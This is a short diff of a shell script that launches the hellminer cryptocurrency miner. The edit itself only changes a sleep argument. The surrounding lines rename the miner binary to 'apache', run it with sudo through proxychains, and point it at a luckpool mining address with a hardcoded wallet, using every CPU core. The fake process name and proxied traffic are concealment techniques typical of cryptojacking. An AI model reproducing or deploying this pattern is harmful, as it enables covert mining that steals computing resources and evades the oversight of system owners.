@@ -16,6 +16,6 @@ tar xf hellminer_cpu_linux.tar.gz
 rm hellminer_cpu_linux.tar.gz
 mv hellminer apache
 
-sleep 5s
+sleep 5
 
 sudo proxychains ./apache -c stratum+tcp://eu.luckpool.net:3956#xnsub -u RKJZtNARyonv8N2GtPAo5E7sn8uHPjt2LZ.kuyax-$(echo $(nproc --all)) -p x --cpu $(echo $(nproc --all))
